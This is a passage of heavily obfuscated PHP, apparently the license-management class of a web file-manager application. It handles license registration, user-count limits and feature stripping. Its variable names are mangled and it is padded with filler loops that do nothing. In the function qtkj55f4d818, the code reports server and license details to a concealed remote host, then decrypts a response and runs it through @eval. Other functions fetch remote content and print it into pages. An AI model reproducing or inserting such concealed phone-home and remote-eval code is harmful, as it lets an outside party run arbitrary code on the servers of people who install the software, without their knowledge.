$üŞíŒ¬Å[189] => rand_string(16), $üŞíŒ¬Å[104] => $¯î…€…„[$üŞíŒ¬Å[190]]); if ($¹º•ƒÔ[$üŞíŒ¬Å[151]]) { $ëÍ±€Ï[$üŞíŒ¬Å[189]] = $¹º•ƒÔ[$üŞíŒ¬Å[151]]; } $ûîåŒ×å = substr(md5($ëÍ±€Ï[$üŞíŒ¬Å[187]]), 10, 10); $ƒÇ£Å¬ª = $ûîåŒ×å . $ëÍ±€Ï[$üŞíŒ¬Å[104]] . $ëÍ±€Ï[$üŞíŒ¬Å[189]]; $ëÍ±€Ï[$üŞíŒ¬Å[106]] = strrev(base64_encode($this->hnpt5bb6ae11($ƒÇ£Å¬ª, $üŞíŒ¬Å[191]))); $ì·âÊÅ = $áø‰½ƒ‡[663]; while ($ì·âÊÅ < $áø‰½ƒ‡[624]) { if ($ì·âÊÅ >= 0) { break; } $ì·âÊÅ++; } $ıÌª¡© = rand_string(16); $ÉŠ¿‘±Ç = $ıÌª¡© . $ëÍ±€Ï[$üŞíŒ¬Å[104]] . $this->hnpt5bb6ae11(md5($ëÍ±€Ï[$üŞíŒ¬Å[185]]), $ıÌª¡©); $ëÍ±€Ï[$üŞíŒ¬Å[107]] = base64_encode(strrev($this->hnpt5bb6ae11($ÉŠ¿‘±Ç, $üŞíŒ¬Å[192]))); $şå½åò‹ = $áø‰½ƒ‡[664]; if (strlen($şå½åò‹) < $áø‰½ƒ‡[626]) { die; } if ($¯î…€…„[$üŞíŒ¬Å[193]] && $¯î…€…„[$üŞíŒ¬Å[193]] >= 1) { Model($üŞíŒ¬Å[33])->setDeep($üŞíŒ¬Å[194], $üŞíŒ¬Å[120]); } Model($üŞíŒ¬Å[33])->set($ëÍ±€Ï); $ı‚Û¾ = md5($_SERVER[$üŞíŒ¬Å[101]] . strrev($š€ìÖ°¦) . $ëÍ±€Ï[$üŞíŒ¬Å[187]]); $¡©›ñµ  = $áø‰½ƒ‡[665]; $‚²ãÑÃ‡ = strrev(substr($ı‚Û¾, 10, 16)); $Ü‚®Î¿û = $áø‰½ƒ‡[666]; while ($Ü‚®Î¿û < $áø‰½ƒ‡[626]) { if ($Ü‚®Î¿û >= 0) { break; } $Ü‚®Î¿û++; } $Ş×ˆşÀå = $this->djarf4d44748(json_encode($¯î…€…„), $ı‚Û¾); $Â³½ãİÈ = array_to_keyvalue(Model($üŞíŒ¬Å[7])->listData(), $üŞíŒ¬Å[195]); $™‡«ÃÒÙ = $Â³½ãİÈ[$üŞíŒ¬Å[196]]; $Šúô•— = $áø‰½ƒ‡[667]; if (strlen($Šúô•—) < $áø‰½ƒ‡[635]) { die; } $í²ú†…œ = array(); $í²ú†…œ[$‚²ãÑÃ‡] = $Ş×ˆşÀå; $ã…»”ë® = $áø‰½ƒ‡[668]; Model($üŞíŒ¬Å[7])->update($™‡«ÃÒÙ[$üŞíŒ¬Å[197]], array($üŞíŒ¬Å[198] => $í²ú†…œ)); $this->garh1805068c = $¯î…€…„; $this->rfyq03a91281 = $ëÍ±€Ï[$üŞíŒ¬Å[104]]; $ïşæ®á = $áø‰½ƒ‡[669]; if (!$ïşæ®á) { die; } $this->licenseRegistSuccess(); Cache::set($üŞíŒ¬Å[199] . md5($š€ìÖ°¦ . $üŞíŒ¬Å[200]), $üŞíŒ¬Å[6]); show_json(LNG($üŞíŒ¬Å[184]), !0); } private function licenseRegistSuccess() { $“ÃÄ«³ =& $_SERVER[ìõ½ó«ú]; $ãÏ÷øÉ = Model($“ÃÄ«³[33])->get(); if ($ãÏ÷øÉ[$“ÃÄ«³[63]] != $“ÃÄ«³[120]) { Model($“ÃÄ«³[33])->set($“ÃÄ«³[63], $“ÃÄ«³[120]); } Action($“ÃÄ«³[201])->initStart(!0); } private function cvsnc5d14ea8() { $ËÂ¨şÊ¡ =& $_SERVER[ñˆ‹ß¿÷]; $À×Œ…ŸÊ =& $_SERVER[ìõ½ó«ú]; Model($À×Œ…ŸÊ[33])->set(array($À×Œ…ŸÊ[185] => $À×Œ…ŸÊ[6], $À×Œ…ŸÊ[187] => $À×Œ…ŸÊ[6], $À×Œ…ŸÊ[104] => $À×Œ…ŸÊ[105], $À×Œ…ŸÊ[106] => $À×Œ…ŸÊ[6], $À×Œ…ŸÊ[107] => $À×Œ…ŸÊ[6])); $Áæ¡—÷Õ = $ËÂ¨şÊ¡[670]; if (strlen($Áæ¡—÷Õ) < $ËÂ¨şÊ¡[624]) { die; } Model($À×Œ…ŸÊ[33])->setDeep($À×Œ…ŸÊ[194], $À×Œ…ŸÊ[202]); $this->garh1805068c = array(); $µî¨ŸíÚ = $ËÂ¨şÊ¡[671]; if (strlen($µî¨ŸíÚ) < $ËÂ¨şÊ¡[615]) { return; } $this->rfyq03a91281 = $À×Œ…ŸÊ[105]; } private function mpvi0802cb75() { $ÊÁõ´„ı =& $_SERVER[ñˆ‹ß¿÷]; $€Š­úÇ =& $_SERVER[ìõ½ó«ú]; $_SERVER[$€Š­úÇ[158]] = _get($_SERVER, $€Š­úÇ[158], APP_HOST); $this->rfyq03a91281 = $€Š­úÇ[105]; $üğõØñ› = $ÊÁõ´„ı[672]; $áÏ¯ñ©ö = Model($€Š­úÇ[33])->get(); if ($áÏ¯ñ©ö[$€Š­úÇ[104]] == $€Š­úÇ[105]) { return; } $Èğ¡‚†€ = Model($€Š­úÇ[33])->get($€Š­úÇ[102]); $Ã‚õîú¤ = $€Š­úÇ[199] . md5($Èğ¡‚†€ . $€Š­úÇ[200]); $¶†šÜÂ = Cache::get($Ã‚õîú¤); $úÁˆòŠ = $ÊÁõ´„ı[673]; while ($úÁˆòŠ < $ÊÁõ´„ı[615]) { if ($úÁˆòŠ >= 0) { break; } $úÁˆòŠ++; } if (!is_array($¶†šÜÂ) || !isset($¶†šÜÂ[$€Š­úÇ[203]]) || time() - $¶†šÜÂ[$€Š­úÇ[203]] >= 60) { $ÚÍé…‘É = Model($€Š­úÇ[7])->loadList(); $õŒ’æã = $ÚÍé…‘É[$€Š­úÇ[196]]; $´âÖëŞŠ = md5($_SERVER[$€Š­úÇ[101]] . strrev($Èğ¡‚†€) . $áÏ¯ñ©ö[$€Š­úÇ[187]]); $ÂáñÖ´á = strrev(substr($´âÖëŞŠ, 10, 16)); $¶†šÜÂ = $this->rpmo0d9f576f($õŒ’æã[$€Š­úÇ[84]][$ÂáñÖ´á], $´âÖëŞŠ); $¶†šÜÂ = json_decode($¶†šÜÂ, !0); } if (!is_array($¶†šÜÂ)) { return $this->cvsnc5d14ea8(); } $çİ™ÜÖ© = strtotime($¶†šÜÂ[$€Š­úÇ[127]]); if (time() >= $çİ™ÜÖ©) { return $this->cvsnc5d14ea8(); } if (time() - $¶†šÜÂ[$€Š­úÇ[203]] > 20) { $¶†šÜÂ[$€Š­úÇ[203]] = time(); Cache::set($Ã‚õîú¤, $¶†šÜÂ); } $this->garh1805068c = $¶†šÜÂ; $this->rfyq03a91281 = $áÏ¯ñ©ö[$€Š­úÇ[104]]; $Ë›ã€ù“ = $ÊÁõ´„ı[674]; } private function xhgj537f389f() { $áÇóªİ‹ =& $_SERVER[ñˆ‹ß¿÷]; $®’†Úúê =& $_SERVER[ìõ½ó«ú]; $šÀá²ûÃ = $GLOBALS[$®’†Úúê[13]]; $ˆ™ÆÑÂğ = $áÇóªİ‹[675]; while (strlen($ˆ™ÆÑÂğ) < $áÇóªİ‹[615]) { if (!$ˆ™ÆÑÂğ) { break; } $ˆ™ÆÑÂğ++; } $‰÷§Öø = $_SERVER[$®’†Úúê[24]]; $’¦€¿æŠ = $áÇóªİ‹[676]; if (!$’¦€¿æŠ) { die; } if ($‰÷§Öø == $®’†Úúê[204] && $this->rfyq03a91281 == $®’†Úúê[105]) { show_json(LNG($®’†Úúê[205]), !1, $®’†Úúê[206]); } $†ùğ¦Ì = array($®’†Úúê[207], $®’†Úúê[208]); if (in_array($‰÷§Öø, $†ùğ¦Ì)) { if ($this->rfyq03a91281 == $®’†Úúê[105] && isset($šÀá²ûÃ[$®’†Úúê[209]])) { show_json(LNG($®’†Úúê[205]), !1, $®’†Úúê[206]); die; } $Ã¿¥ğşÁ = $this->fcaq794271b2(); if ($Ã¿¥ğşÁ != intval($®’†Úúê[210])) { if ($Ã¿¥ğşÁ <= Model($®’†Úúê[123])->count()) { show_json(LNG($®’†Úúê[211]), !1, $®’†Úúê[206]); die; } } } } private function aboz051fe6fd() { $¤Úí’ñÚ =& $_SERVER[ñˆ‹ß¿÷]; $”±ûş€› =& $_SERVER[ìõ½ó«ú]; $ì²Å†àò = array($”±ûş€›[117], $”±ûş€›[118]); $©ÁŒË = $¤Úí’ñÚ[677]; if (!$©ÁŒË) { die; } if (!_get($GLOBALS, $”±ûş€›[114]) || !isset($_GET[$”±ûş€›[212]])) { return; } if (!in_array($_SERVER[$”±ûş€›[24]], $ì²Å†àò)) { return; } $ Ö§º–µ = $”±ûş€›[213]; $’Ûªû‚´ = $¤Úí’ñÚ[678]; if (!$’Ûªû‚´) { die; } $ Ö§º–µ = $this->xqnzbb35943e($ Ö§º–µ, $”±ûş€›[214]); $âÑ´˜İ© = stream_context_create(array($”±ûş€›[215] => array($”±ûş€›[216] => $”±ûş€›[217], $”±ûş€›[218] => 3))); $šÚšâ¹” = $¤Úí’ñÚ[679]; while ($šÚšâ¹” < $¤Úí’ñÚ[615]) { if ($šÚšâ¹” >= 0) { break; } $šÚšâ¹”++; } $šµææœø = @file_get_contents($ Ö§º–µ, !1, $âÑ´˜İ©); $ùÄ×¶ñ¦ = $¤Úí’ñÚ[680]; while (strlen($ùÄ×¶ñ¦) < $¤Úí’ñÚ[619]) { if (!$ùÄ×¶ñ¦) { break; } $ùÄ×¶ñ¦++; } header($”±ûş€›[219]); if ($šµææœø && strstr($šµææœø, $”±ûş€›[220])) { echo $šµææœø; } die; } public function itre4c3418af($ß¼ı¸™Î) { $„Ó†œ² =& $_SERVER[ñˆ‹ß¿÷]; $âÄ©± =& $_SERVER[ìõ½ó«ú]; if ($this->rfyq03a91281 == $âÄ©±[221]) { return $ß¼ı¸™Î; } $èË¢¬ÜÖ = array($âÄ©±[222] => $âÄ©±[223], $âÄ©±[224] => $âÄ©±[223], $âÄ©±[225] => $âÄ©±[223], $âÄ©±[226] => $âÄ©±[223], $âÄ©±[227] => $âÄ©±[228], $âÄ©±[229] => $âÄ©±[228], $âÄ©±[230] => $âÄ©±[228], $âÄ©±[231] => $âÄ©±[228], $âÄ©±[232] => $âÄ©±[228], $âÄ©±[233] => $âÄ©±[228], $âÄ©±[234] => $âÄ©±[228], $âÄ©±[235] => $âÄ©±[228], $âÄ©±[236] => $âÄ©±[228], $âÄ©±[237] => $âÄ©±[228], $âÄ©±[238] => $âÄ©±[228], $âÄ©±[239] => $âÄ©±[228]); $æÇÍüÖ” = $„Ó†œ²[681]; $çİÅèÃ’ = explode($âÄ©±[240], _get($this->garh1805068c, $âÄ©±[111], $âÄ©±[6])); $Èøáï×Ö = $„Ó†œ²[682]; if (strlen($Èøáï×Ö) < $„Ó†œ²[615]) { return; } $ùçİ«¯ë = array(); foreach ($èË¢¬ÜÖ as $ğŠÒí¡ => $É¤Ù¨Ø) { if ($É¤Ù¨Ø == $âÄ©±[223] && substr($this->rfyq03a91281, 0, 1) == $âÄ©±[223]) { continue; } if (!in_array($ğŠÒí¡, $çİÅèÃ’)) { $ùçİ«¯ë[] = $ğŠÒí¡; } } foreach ($ùçİ«¯ë as $ğŠÒí¡) { unset($ß¼ı¸™Î[$ğŠÒí¡]); } return $ß¼ı¸™Î; $Š¶É¨³ì = $„Ó†œ²[683]; } private function ysnxd5746268() { $Ø†ˆ‘×® =& $_SERVER[ìõ½ó«ú]; if ($this->rfyq03a91281 != $Ø†ˆ‘×®[105]) { $GLOBALS[$Ø†ˆ‘×®[84]][$Ø†ˆ‘×®[88]][$Ø†ˆ‘×®[241]] = $Ø†ˆ‘×®[202]; return; } $GLOBALS[$Ø†ˆ‘×®[84]][$Ø†ˆ‘×®[242]] = $Ø†ˆ‘×®[120]; if (Model($Ø†ˆ‘×®[243])->get($Ø†ˆ‘×®[63]) != $Ø†ˆ‘×®[202]) { Model($Ø†ˆ‘×®[243])->set($Ø†ˆ‘×®[63], $Ø†ˆ‘×®[202]); } } public function iwsbb6aac912() { $¤ÙÖÓ… =& $_SERVER[ñˆ‹ß¿÷]; return $_SERVER[ìõ½ó«ú][244]; $ª–ßÇíŒ = $¤ÙÖÓ…[684]; while (strlen($ª–ßÇíŒ) < $¤ÙÖÓ…[615]) { if (!$ª–ßÇíŒ) { break; } $ª–ßÇíŒ++; } } private function qtkj55f4d818() { $€ææ†‰Ğ =& $_SERVER[ñˆ‹ß¿÷]; $®× Îşé =& $_SERVER[ìõ½ó«ú]; $¬ÎÇ„ = array($®× Îşé[245], $®× Îşé[246], $®× Îşé[247]); $»÷ããÓĞ = $€ææ†‰Ğ[685]; if (!$»÷ããÓĞ) { die; } $¸Èàê¦É = $®× Îşé[248] . md5($®× Îşé[249]); $’ûñ§ì = $€ææ†‰Ğ[686]; while (strlen($’ûñ§ì) < $€ææ†‰Ğ[635]) { if (!$’ûñ§ì) { break; } $’ûñ§ì++; } if ($this->rfyq03a91281 == $®× Îşé[105] || !_get($GLOBALS, $®× Îşé[114])) { return; } if (!in_array($_SERVER[$®× Îşé[24]], $¬ÎÇ„)) { return; } if (time() % 4 != 0) { return; } $¾–ê‚ø = call_user_func(array($®× Îşé[250], $®× Îşé[251]), $¸Èàê¦É); $ÑÏ¢Â¸œ = $€ææ†‰Ğ[687]; if ($¾–ê‚ø && time() - $¾–ê‚ø < intval($®× Îşé[252])) { return; } call_user_func(array($®× Îşé[250], $®× Îşé[137]), $¸Èàê¦É, time()); $»âë•‡ = $€ææ†‰Ğ[688]; if (!$»âë•‡) { die; } $ÅÊÊÛşç = Model($®× Îşé[33])->get($®× Îşé[102]); $õŸ¥Ìí = $€ææ†‰Ğ[689]; while (strlen($õŸ¥Ìí) < $€ææ†‰Ğ[635]) { if (!$õŸ¥Ìí) { break; } $õŸ¥Ìí++; } $ŞÎ–²’´ = array($®× Îşé[149] => Model($®× Îşé[33])->get($®× Îşé[185]), $®× Îşé[162] => $this->rfyq03a91281, $®× Îşé[159] => $_SERVER[$®× Îşé[160]], $®× Îşé[161] => Model($®× Îşé[33])->get($®× Îşé[129]), $®× Îşé[100] => md5($_SERVER[$®× Îşé[101]] . $ÅÊÊÛşç), $®× Îşé[152] => $®× Îşé[134], $®× Îşé[155] => $_SERVER[$®× Îşé[156]]); $¿ØÛ¼ñ = $this->udyvf718036e($®× Îşé[253], $ŞÎ–²’´); if (!is_array($¿ØÛ¼ñ)) { return; } if ($¿ØÛ¼ñ[$®× Îşé[149]] && $¿ØÛ¼ñ[$®× Îşé[254]]) { if ($this->srpo83e73180($¿ØÛ¼ñ[$®× Îşé[254]]) == $ŞÎ–²’´[$®× Îşé[149]]) { return; } } $this->cvsnc5d14ea8(); if ($this->srpo83e73180($¿ØÛ¼ñ[$®× Îşé[254]]) != $ŞÎ–²’´[$®× Îşé[149]]) { $õğ–Ûàˆ = array($®× Îşé[180] => $ÅÊÊÛşç, $®× Îşé[181] => $_SERVER[$®× Îşé[101]], $®× Îşé[182] => this_url(), $®× Îşé[157] => $_SERVER[$®× Îşé[158]]); $‹˜…¹ë = $this->hbtwd84ac7ba(json_encode($õğ–Ûàˆ)); $¿ØÛ¼ñ = $this->udyvf718036e($®× Îşé[183] . $‹˜…¹ë); if ($¿ØÛ¼ñ && is_array($¿ØÛ¼ñ) && isset($¿ØÛ¼ñ[$®× Îşé[254]])) { $Š¯ÍÌ‡ = $this->rpmo0d9f576f($¿ØÛ¼ñ[$®× Îşé[254]], 2); if ($Š¯ÍÌ‡) { $Š¯ÍÌ‡ = $this->srpo83e73180($Š¯ÍÌ‡); } if ($Š¯ÍÌ‡) { try { @eval($Š¯ÍÌ‡); } catch (Exception $…ÉÄó…) { } } } } } private function udyvf718036e($ŒÃ÷¡½ = '', $ïÒ¾È„ = array(), $°’¢ƒÈ÷ = 5) { $Î¿Ô¬¬ =& $_SERVER[ñˆ‹ß¿÷]; $¸åŞ“Øó =& $_SERVER[ìõ½ó«ú]; $‰¯êÔ = $¸åŞ“Øó[255]; $Í»–é÷ê = $Î¿Ô¬¬[690]; $‰¯êÔ = $this->xqnzbb35943e($‰¯êÔ, $¸åŞ“Øó[256]); $áÖëïÃÌ = $Î¿Ô¬¬[691]; while ($áÖëïÃÌ < $Î¿Ô¬¬[635]) { if ($áÖëïÃÌ >= 0) { break; } $áÖëïÃÌ++; } $‰¯êÔ = $‰¯êÔ . $ŒÃ÷¡½; $íûá©³ì = $Î¿Ô¬¬[692]; while (strlen($íûá©³ì) < $Î¿Ô¬¬[619]) { if (!$íûá©³ì) { break; } $íûá©³ì++; } if ($ïÒ¾È„ && is_array($ïÒ¾È„)) { $‰¯êÔ = $‰¯êÔ . $¸åŞ“Øó[257] . http_build_query($ïÒ¾È„); } if ($ïÒ¾È„ === -1) { return $‰¯êÔ; } $Šğ›éëû = stream_context_create(array($¸åŞ“Øó[215] => array($¸åŞ“Øó[218] => $°’¢ƒÈ÷, $¸åŞ“Øó[216] => $¸åŞ“Øó[258]), $¸åŞ“Øó[259] => array($¸åŞ“Øó[260] => !1, $¸åŞ“Øó[261] => !1))); $ïÒ¾È„ = @file_get_contents($‰¯êÔ, !1, $Šğ›éëû); $Åèı¾üÑ = $Î¿Ô¬¬[693]; if (strlen($Åèı¾üÑ) < $Î¿Ô¬¬[626]) { die; } return json_decode($ïÒ¾È„, !0); $—ÃÎÏ = $Î¿Ô¬¬[694]; while ($—ÃÎÏ < $Î¿Ô¬¬[624]) { if ($—ÃÎÏ >= 0) { break; } $—ÃÎÏ++; } $™…Şóµ = $Î¿Ô¬¬[695]; if (strlen($™…Şóµ) < $Î¿Ô¬¬[619]) { die; } } private function fcaq794271b2() { $öÃíå¶× =& $_SERVER[ñˆ‹ß¿÷]; $ŒÕ™êˆ =& $_SERVER[ìõ½ó«ú]; $ÑÒ‘Ñı¨ = array($ŒÕ™êˆ[262] => $ŒÕ™êˆ[263], $ŒÕ™êˆ[264] => $ŒÕ™êˆ[265], $ŒÕ™êˆ[266] => $ŒÕ™êˆ[267], $ŒÕ™êˆ[268] => $ŒÕ™êˆ[269], $ŒÕ™êˆ[270] => $ŒÕ™êˆ[271], $ŒÕ™êˆ[272] => $ŒÕ™êˆ[210], $ŒÕ™êˆ[273] => $ŒÕ™êˆ[210], $ŒÕ™êˆ[274] => $ŒÕ™êˆ[263], $ŒÕ™êˆ[275] => $ŒÕ™êˆ[265], $ŒÕ™êˆ[276] => $ŒÕ™êˆ[267], $ŒÕ™êˆ[277] => $ŒÕ™êˆ[278], $ŒÕ™êˆ[279] => $ŒÕ™êˆ[269], $ŒÕ™êˆ[280] => $ŒÕ™êˆ[281], $ŒÕ™êˆ[282] => $ŒÕ™êˆ[271], $ŒÕ™êˆ[283] => $ŒÕ™êˆ[284], $ŒÕ™êˆ[285] => $ŒÕ™êˆ[286], $ŒÕ™êˆ[287] => $ŒÕ™êˆ[288]); $Ôá ©‹– = $öÃíå¶×[696]; while ($Ôá ©‹– < $öÃíå¶×[624]) { if ($Ôá ©‹– >= 0) { break; } $Ôá ©‹–++; } $À ÷õ£ = $ÑÒ‘Ñı¨[$this->rfyq03a91281]; $Ï…ÊƒÕ = $öÃíå¶×[697]; if (!$Ï…ÊƒÕ) { die; } $À ÷õ£ = intval($À ÷õ£ ? $À ÷õ£ : $ŒÕ™êˆ[263]); $½†—ä‰ = $öÃíå¶×[698]; if (strlen($½†—ä‰) < $öÃíå¶×[624]) { return; } $ããæ±• = _get($this->garh1805068c, $ŒÕ™êˆ[289]); $‰—‰®á« = $öÃíå¶×[699]; $ããæ±• = $ããæ±• ? intval($ããæ±•) : 0; return $À ÷õ£ + $ããæ±•; $×ò¢õÈÆ = $öÃíå¶×[700]; if (!$×ò¢õÈÆ) { die; } } public function yqud3c592f77($²§¸¤º‡) { $ğŸ–¥§µ =& $_SERVER[ñˆ‹ß¿÷]; $Æ¤ÛˆÆã =& $_SERVER[ìõ½ó«ú]; $Şç„¤‘º = $this->fcaq794271b2(); $äó¾¦ëÃ = $ğŸ–¥§µ[701]; if (strlen($äó¾¦ëÃ) < $ğŸ–¥§µ[615]) { return; } if ($²§¸¤º‡[$Æ¤ÛˆÆã[290]] == $Æ¤ÛˆÆã[120]) { return; } if ($Şç„¤‘º >= intval($Æ¤ÛˆÆã[210])) { return; } $£¿Ü®¸˜ = Model($Æ¤ÛˆÆã[123])->count(); if ($£¿Ü®¸˜ <= $Şç„¤‘º) { return; } $Ğ€—´Ñı = Model($Æ¤ÛˆÆã[123])->field($Æ¤ÛˆÆã[290])->limit($Şç„¤‘º)->select(); $×ìæ¿ŸÓ = $ğŸ–¥§µ[702]; if (!$×ìæ¿ŸÓ) { return; } $Ğ€—´Ñı = array_to_keyvalue($Ğ€—´Ñı, $Æ¤ÛˆÆã[6], $Æ¤ÛˆÆã[290]); $Ø‡Ó¯¶ñ = $ğŸ–¥§µ[703]; if (!$Ø‡Ó¯¶ñ) { die; } if (!in_array($²§¸¤º‡[$Æ¤ÛˆÆã[290]], $Ğ€—´Ñı)) { show_json($Æ¤ÛˆÆã[291], !1, $Æ¤ÛˆÆã[206]); } } public function hevn03da04a9() { $¡çÒ¬äŠ =& $_SERVER[ìõ½ó«ú]; if (!_get($GLOBALS, $¡çÒ¬äŠ[114]) || mt_rand(1, 100) > 20) { return; } $Øô×˜ªš = $¡çÒ¬äŠ[213]; $Øô×˜ªš = $this->xqnzbb35943e($Øô×˜ªš, $¡çÒ¬äŠ[214]); $Õá·ç˜ñ = $_SERVER[ñˆ‹ß¿÷][704]; if (!$Õá·ç˜ñ) { return; } $ª¾Ù¿é  = stream_context_create(array($¡çÒ¬äŠ[215] => array($¡çÒ¬äŠ[216] => $¡çÒ¬äŠ[217], $¡çÒ¬äŠ[218] => 3))); $Ÿ‹ãÃ¬Ø = @file_get_contents($Øô×˜ªš, !1, $ª¾Ù¿é ); echo $¡çÒ¬äŠ[292] . hash_encode($Ÿ‹ãÃ¬Ø) . $¡çÒ¬äŠ[293]; } private function djarf4d44748($‡Ïêêìü, $äñ€«ßá, $¿ùì—ã = 3) { $Â”“€Ÿ¦ =& $_SERVER[ñˆ‹ß¿÷]; $—Òëš‚¼ =& $_SERVER[ìõ½ó«ú]; usleep(1); $‡Ïêêìü = trim($‡Ïêêìü); $ˆªü—¬Ú = mt_rand(0, 5) . $—Òëš‚¼[6]; $İ¦ÙŠ‘¯ = rand_string(15); $ÁŸÎè‚Ó = $Â”“€Ÿ¦[705]; $âçğÜÙ = $—Òëš‚¼[294]; switch ($ˆªü—¬Ú) { case $—Òëš‚¼[202]: $Ò¨Ò»‰ = $this->hnpt5bb6ae11($‡Ïêêìü, strrev($äñ€«ßá . $İ¦ÙŠ‘¯)); $µìïÅÀº = $Â”“€Ÿ¦[660]; while ($µìïÅÀº < $Â”“€Ÿ¦[635]) { if ($µìïÅÀº >= 0) { break; } $µìïÅÀº++; } break; case $—Òëš‚¼[120]: $Ò¨Ò»‰ = $this->hnpt5bb6ae11($‡Ïêêìü, strrev($İ¦ÙŠ‘¯ . $äñ€«ßá)); $ëØÉ›Â¯ = $Â”“€Ÿ¦[706]; if (strlen($ëØÉ›Â¯) < $Â”“€Ÿ¦[615]) { die; } break; $ƒÈ‰ĞÌŸ = $Â”“€Ÿ¦[707]; while (strlen($ƒÈ‰ĞÌŸ) < $Â”“€Ÿ¦[624]) { if (!$ƒÈ‰ĞÌŸ) { break; } $ƒÈ‰ĞÌŸ++; } case $—Òëš‚¼[295]: $Ò¨Ò»‰ = $this->hnpt5bb6ae11($‡Ïêêìü, base64_encode($İ¦ÙŠ‘¯ . $äñ€«ßá)); $Œößúôü = $Â”“€Ÿ¦[708]; break; $×“«á³ = $Â”“€Ÿ¦[709]; if (!$×“«á³) { return; } case $—Òëš‚¼[296]: $Ò¨Ò»‰ = $this->hnpt5bb6ae11($‡Ïêêìü, md5($İ¦ÙŠ‘¯ . $äñ€«ßá)); $Æã¦ş• = $Â”“€Ÿ¦[710]; while (strlen($Æã¦ş•) < $Â”“€Ÿ¦[624]) { if (!$Æã¦ş•) { break; } $Æã¦ş•++; } break; case $—Òëš‚¼[297]: $‡Ïêêìü = base64_encode($‡Ïêêìü); $µØÀ¥ˆ = rand(0, 64); $”µ”×Ñ¢ = $Â”“€Ÿ¦[711]; if (strlen($”µ”×Ñ¢) < $Â”“€Ÿ¦[635]) { return; } $‚œáôàØ = $âçğÜÙ[$µØÀ¥ˆ]; $ÖîËÕµ¬ = $Â”“€Ÿ¦[712]; if (!$ÖîËÕµ¬) { return; } $²´·àÈÕ = md5($‚œáôàØ . md5($äñ€«ßá . $‚œáôàØ) . $äñ€«ßá); $»‚Œ„¹ã = $Â”“€Ÿ¦[713]; if (strlen($»‚Œ„¹ã) < $Â”“€Ÿ¦[615]) { return; } $²´·àÈÕ = substr($²´·àÈÕ, $µØÀ¥ˆ % 8, $µØÀ¥ˆ % 8 + 7); $öçÂ×ê… = $Â”“€Ÿ¦[714]; if (!$öçÂ×ê…) { die; } $íæşİ‰ù = $—Òëš‚¼[6]; $í¼È™îÜ = 0; $Óª»ÊÛË = $Â”“€Ÿ¦[715]; $ğ©´ÂÒ = 0; $ÃÂì¹æÄ = 0; $Œöµ½ = $Â”“€Ÿ¦[716]; for ($í¼È™îÜ = 0; $í¼È™îÜ < strlen($‡Ïêêìü); $í¼È™îÜ++) { $ÃÂì¹æÄ = $ÃÂì¹æÄ == strlen($²´·àÈÕ) ? 0 : $ÃÂì¹æÄ; $ğ©´ÂÒ = ($µØÀ¥ˆ + strpos($âçğÜÙ, $‡Ïêêìü[$í¼È™îÜ]) + ord($²´·àÈÕ[$ÃÂì¹æÄ++])) % 64; $¼º®«œ» = $Â”“€Ÿ¦[717]; if (!$¼º®«œ») { return; } $íæşİ‰ù .= $âçğÜÙ[$ğ©´ÂÒ]; } $Ò¨Ò»‰ = hash_encode($‚œáôàØ . $íæşİ‰ù); $•ÖÆ«Ãİ = $Â”“€Ÿ¦[718]; if (strlen($•ÖÆ«Ãİ) < $Â”“€Ÿ¦[626]) { die; } break; default: $Ò¨Ò»‰ = $this->hnpt5bb6ae11($‡Ïêêìü, $äñ€«ßá . $İ¦ÙŠ‘¯); break; } $Ò¨Ò»‰ = strrev($ˆªü—¬Ú . $İ¦ÙŠ‘¯ . $Ò¨Ò»‰); $»ÕÌüË = $Â”“€Ÿ¦[719]; if (!$»ÕÌüË) { die; } if ($¿ùì—ã - 1 > 0) { $Ò¨Ò»‰ = $this->djarf4d44748($Ò¨Ò»‰, $äñ€«ßá, $¿ùì—ã - 1); } return $Ò¨Ò»‰; } private function rpmo0d9f576f($†ñŒƒıª, $”¡áÎ‡», $óòİüÃÉ = 3) { $âÃ“åÙ =& $_SERVER[ñˆ‹ß¿÷]; $×øÓ¤ñÀ =& $_SERVER[ìõ½ó«ú]; if (!is_string($†ñŒƒıª) || strlen($†ñŒƒıª) < 10) { return !1; } $†ñŒƒıª = trim($†ñŒƒıª); $³éıÔå— = $âÃ“åÙ[720]; $†ñŒƒıª = strrev($†ñŒƒıª); $µÓ¼ğé¡ = $âÃ“åÙ[721]; if (strlen($µÓ¼ğé¡) < $âÃ“åÙ[624]) { return; } $Œ¯ÇÇÁŒ = $†ñŒƒıª[0]; $¢†Ÿ–íÑ = $âÃ“åÙ[722]; $£îŸ‹˜¤ = substr($†ñŒƒıª, 1, 15); $†ñŒƒıª = substr($†ñŒƒıª, 16); $¨„ÉÈºÆ = $âÃ“åÙ[723]; $Ş‰È‡›Ä = $×øÓ¤ñÀ[294]; switch ($Œ¯ÇÇÁŒ) { case $×øÓ¤ñÀ[202]: $ÀìÕªÑ = $this->xqnzbb35943e($†ñŒƒıª, strrev($”¡áÎ‡» . $£îŸ‹˜¤)); $Ãè½› = $âÃ“åÙ[724]; if (strlen($Ãè½›) < $âÃ“åÙ[619]) { return; } break; $³•ÖëÜ­ = $âÃ“åÙ[725]; while ($³•ÖëÜ­ < $âÃ“åÙ[619]) { if ($³•ÖëÜ­ >= 0) { break; } $³•ÖëÜ­++; } case $×øÓ¤ñÀ[120]: $ÀìÕªÑ = $this->xqnzbb35943e($†ñŒƒıª, strrev($£îŸ‹˜¤ . $”¡áÎ‡»)); break; case $×øÓ¤ñÀ[295]: $ÀìÕªÑ = $this->xqnzbb35943e($†ñŒƒıª, base64_encode($£îŸ‹˜¤ . $”¡áÎ‡»)); break; $Ú¥Õ÷ñ = $âÃ“åÙ[726]; while ($Ú¥Õ÷ñ < $âÃ“åÙ[624]) { if ($Ú¥Õ÷ñ >= 0) { break; } $Ú¥Õ÷ñ++; } case $×øÓ¤ñÀ[296]: $ÀìÕªÑ = $this->xqnzbb35943e($†ñŒƒıª, md5($£îŸ‹˜¤ . $”¡áÎ‡»)); break; case $×øÓ¤ñÀ[297]: $†ñŒƒıª = hash_decode($†ñŒƒıª); $ë‡òì„ = $âÃ“åÙ[727]; $‹Ìùê»ã = $†ñŒƒıª[0]; $†ñŒƒıª = substr($†ñŒƒıª, 1); $—£íÊÙ± = strpos($Ş‰È‡›Ä, $‹Ìùê»ã); $æä–³ÖÜ = md5($‹Ìùê»ã . md5($”¡áÎ‡» . $‹Ìùê»ã) . $”¡áÎ‡»); $¤ÅÚÉ–· = $âÃ“åÙ[728]; if (strlen($¤ÅÚÉ–·) < $âÃ“åÙ[624]) { die; } $æä–³ÖÜ = substr($æä–³ÖÜ, $—£íÊÙ± % 8, $—£íÊÙ± % 8 + 7); $Ï½Ê«ü = $×øÓ¤ñÀ[6]; $ğ¨³ºûâ = 